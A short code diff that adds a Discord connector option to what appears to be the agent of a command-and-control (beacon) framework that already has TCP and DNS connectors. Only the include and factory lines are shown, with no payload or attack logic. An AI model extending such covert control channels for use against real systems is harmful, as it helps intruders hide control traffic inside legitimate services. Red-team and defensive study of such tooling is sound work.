@@ -15,6 +15,8 @@
 #include "ConnectorTCP.h"
 #elif defined(BEACON_DNS)
 #include "ConnectorDNS.h"
+#elif defined(BEACON_DISCORD)
+#include "ConnectorDiscord.h"
 #endif
 
 Agent* g_Agent;
@@ -30,6 +32,8 @@ static Connector* CreateConnector()
 	return new ConnectorTCP();
 #elif defined(BEACON_DNS)
 	return new ConnectorDNS();
+#elif defined(BEACON_DISCORD)
+	return new ConnectorDiscord();
 #endif
 }
 
